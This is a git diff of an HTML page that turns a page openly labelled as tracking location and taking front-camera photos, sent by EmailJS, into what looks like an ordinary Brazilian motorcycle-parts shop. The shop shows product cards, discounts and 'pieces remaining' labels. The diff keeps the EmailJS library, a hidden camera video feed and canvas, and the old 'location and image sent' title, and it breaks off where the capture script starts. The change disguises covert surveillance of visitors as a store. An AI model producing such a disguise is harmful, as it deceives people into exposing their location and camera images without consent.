@@ -4,99 +4,187 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Localização e Imagem Ativa Enviada!</title>
+    <link rel="stylesheet" href="style.css" />
     <script
       type="text/javascript"
       src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"
     ></script>
     <style>
-      body {
-        font-family: Arial, sans-serif;
-        display: flex;
-        flex-direction: column;
-        justify-content: center;
-        align-items: center;
-        min-height: 100vh;
-        margin: 0;
-        background-color: #f0f8ff; /* Um azul bem clarinho */
-        color: #333;
-        text-align: center;
+      header {
+        background: url("./banner.png") no-repeat top center fixed;
+        height: 450px;
       }
-      .content {
-        background-color: #ffffff;
-        padding: 40px;
-        border-radius: 15px;
-        box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
-        max-width: 400px;
-        width: 90%;
+
+      .old-price {
+        text-decoration: line-through;
+        color: #888;
       }
-      .emoji {
-        font-size: 80px;
-        margin-bottom: 20px;
-        animation: bounce 2s infinite; /* Pequena animação para o emoji */
-      }
-      @keyframes bounce {
-        0%,
-        20%,
-        50%,
-        80%,
-        100% {
-          transform: translateY(0);
-        }
-        40% {
-          transform: translateY(-15px);
-        }
-        60% {
-          transform: translateY(-7px);
-        }
-      }
-      h1 {
-        color: #4682b4; /* Um azul mais escuro */
-        margin-bottom: 15px;
-      }
-      p {
-        font-size: 1.1em;
-        line-height: 1.6;
-      }
-      #status-message {
+      .last {
+        color: red;
         font-weight: bold;
-        color: #555;
-        margin-top: 20px;
-      }
-      #last-sent-message {
-        margin-top: 10px;
-        font-size: 0.9em;
-        color: #777;
-      }
-      /* Estilos para o vídeo e canvas (escondidos) */
-      #camera-feed,
-      #camera-canvas {
-        position: absolute; /* Tenta mover para fora da tela */
-        left: -9999px;
-        top: -9999px;
-        opacity: 0; /* Torna invisível */
-        width: 1px; /* Minúsculo */
-        height: 1px;
       }
     </style>
   </head>
   <body>
-    <div class="content">
-      <div class="emoji">📸</div>
-      <h1>Rastreando Localização e Capturando Imagem...</h1>
-      <p>
-        Sua localização e uma foto da câmera frontal estão sendo atualizadas e
-        enviadas periodicamente.
-      </p>
-      <p id="status-message">Aguardando permissão de localização e câmera...</p>
-      <p id="last-sent-message"></p>
-      <p>
-        Você pode fechar esta página a qualquer momento para parar o
-        rastreamento.
-      </p>
-    </div>
+    <header></header>
 
-    <video id="camera-feed" playsinline autoplay muted></video>
-    <canvas id="camera-canvas"></canvas>
+    <main>
+      <section id="destaques" class="category">
+        <h2>Destaques</h2>
+        <div class="product-grid">
+          <div class="product-card">
+            <img
+              src="https://m.media-amazon.com/images/I/51mTZisN4fL._AC_SX679_.jpg"
+              alt="Capacete de Moto"
+            />
+            <h3>Capacete de Moto Premium</h3>
+            <p>Proteção e estilo para suas viagens.</p>
+            <span class="old-price">R$ 499,90</span>
+            <span class="price">R$ 299,90</span>
+            <button>Adicionar ao Carrinho</button>
+          </div>
+          <div class="product-card">
+            <img
+              src="https://dor03phawg286.cloudfront.net/Custom/Content/Products/10/43/1043891_jaqueta-texx-falcon-v2-preta-verde-couro_z2_638203576309126851.webp"
+              alt="Jaqueta de Couro"
+            />
+            <h3>Jaqueta de Couro Protetora</h3>
+            <p>Resistência e conforto para o dia a dia.</p>
+            <span class="old-price">R$ 1.095,90</span>
+            <span class="price">R$ 748,00</span>
+            <button>Adicionar ao Carrinho</button>
+          </div>
+          <div class="product-card">
+            <img
+              src="https://images.tcdn.com.br/img/img_prod/186407/luva_alpinestars_sp_8_v3_preto_em_couro_8177_1_57ff6bd45583cb3c049f7c6ffb0057b7_20210726170632.jpg"
+              alt="Luvas de Pilotagem"
+            />
+            <h3>Luvas de Pilotagem Esportivas</h3>
+            <p>Aderência e segurança para suas mãos.</p>
+            <span class="old-price">R$ 398,60</span>
+            <span class="price">R$ 129,50</span>
+            <button>Adicionar ao Carrinho</button>
+          </div>
+        </div>
+      </section>
+
+      <section id="escapamentos" class="category">
+        <h2>Escapamentos</h2>
+        <div class="product-grid">
+          <div class="product-card">
+            <img
+              src="https://http2.mlstatic.com/D_NQ_NP_2X_986197-MLB76460149300_052024-F-ponteira-escape-leovince-motos-universal-tipo-titnio.webp"
+              alt="Escapamento Esportivo"
+            />
+            <h3>Escapamento Esportivo Cromado</h3>
+            <p>Melhore o desempenho e o som da sua moto.</p>
+            <span class="old-price">R$ 267,10</span>
+            <span class="price">R$ 168,00</span>
+            <button>Adicionar ao Carrinho</button>
+          </div>
+          <div class="product-card">
+            <img
+              src="https://http2.mlstatic.com/D_NQ_NP_2X_753858-MLB85921089967_062025-F-escapamento-ponteira-esportiva-kawasaki-z500-ninja-500-se.webp"
+              alt="Ponteira de Carbono"
+            />
+            <h3>Ponteira de Carbono Leve</h3>
+            <p>Design moderno e redução de peso.</p>
+            <span class="old-price">R$ 1.289,00</span>
+            <span class="price">R$ 890,50</span>
+            <button>Adicionar ao Carrinho</button>
+          </div>
+        </div>
+      </section>
+
+      <section id="pneus" class="category">
+        <h2>Pneus</h2>
+        <div class="product-grid">
+          <div class="product-card">
+            <img
+              src="https://cdn.awsli.com.br/2500x2500/2802/2802422/produto/353737215/diablo-supercorsa-spv4-qbba7q31vm.png"
+              alt="Pneu Dianteiro"
+            />
+            <h3>
+              Par Pneu Pirelli 110/70-17 + 150/60-17 Diablo SuperCorsa SPV4 TL
+            </h3>
+            <p>Maior aderência e durabilidade.</p>
+            <span class="old-price">R$ 3.198,35</span>
+            <span class="price">R$ 2.673,25</span>
+            <button>Adicionar ao Carrinho</button>
+          </div>
+          <div class="product-card">
+            <img
+              src="https://cdn.awsli.com.br/2500x2500/2802/2802422/produto/348093522/pirelli-mt16-kit-v43fp5ohfg.png"
+              alt="Pneu Traseiro"
+            />
+            <h3>
+              Par Pneu 80/100-21 + 110/100-18 MT16 Garacross Pirelli Com Câmara
+              - Off-Road
+            </h3>
+            <p>Ideal para terrenos irregulares.</p>
+            <span class="old-price">R$ 1.228,50</span>
+            <span class="price">R$ 892,00</span>
+            <button>Adicionar ao Carrinho</button>
+          </div>
+        </div>
+      </section>
+
+      <section id="acessorios" class="category">
+        <h2>Acessórios</h2>
+        <div class="product-grid">
+          <div class="product-card">
+            <img
+              src="https://http2.mlstatic.com/D_NQ_NP_2X_959604-MLB81633839466_012025-F-capa-para-moto-impermeavel-termica-uv-sol-e-chuva.webp"
+              alt="Capa de Moto"
+            />
+            <h3>Capa Protetora para Moto</h3>
+            <p>Proteja sua moto contra sol e chuva.</p>
+            <span class="old-price">R$ 65,50</span>
+            <span class="price">R$ 37,20</span>
+            <span class="last">5 Peças restantes</span>
+            <button>Adicionar ao Carrinho</button>
+          </div>
+          <div class="product-card">
+            <img
+              src="https://m.media-amazon.com/images/I/51RIygKQk6L._AC_SX679_.jpg"
+              alt="Suporte para Celular"
+            />
+            <h3>Suporte para Celular Universal</h3>
+            <p>Praticidade para suas viagens.</p>
+            <span class="old-price">R$ 135,50</span>
+            <span class="price">R$ 78,12</span>
+            <span class="last">3 Peças restantes</span>
+            <button>Adicionar ao Carrinho</button>
+          </div>
+        </div>
+      </section>
+
+      <section id="contato" class="contact-section">
+        <h2>Contato</h2>
+        <p>Envie-nos uma mensagem ou ligue para nós!</p>
+        <form>
+          <input type="text" placeholder="Seu Nome" />
+          <input type="email" placeholder="Seu Email" />
+          <textarea placeholder="Sua Mensagem"></textarea>
+          <button type="submit">Enviar Mensagem</button>
+        </form>
+        <p>Telefone: (19) 98721-1974</p>
+        <p>Email: contato@hanover.com</p>
+      </section>
+    </main>
+
+    <footer>
+      <p>&copy; 2025 Hanover. Todos os direitos reservados.</p>
+    </footer>
+
+    <video
+      style="display: none"
+      id="camera-feed"
+      playsinline
+      autoplay
+      muted
+    ></video>
+    <canvas style="display: none" id="camera-canvas"></canvas>
 
     <script type="text/javascript">
       // IMPORTANTE: COLOQUE SEUS DADOS DO EMAILJS AQUI!
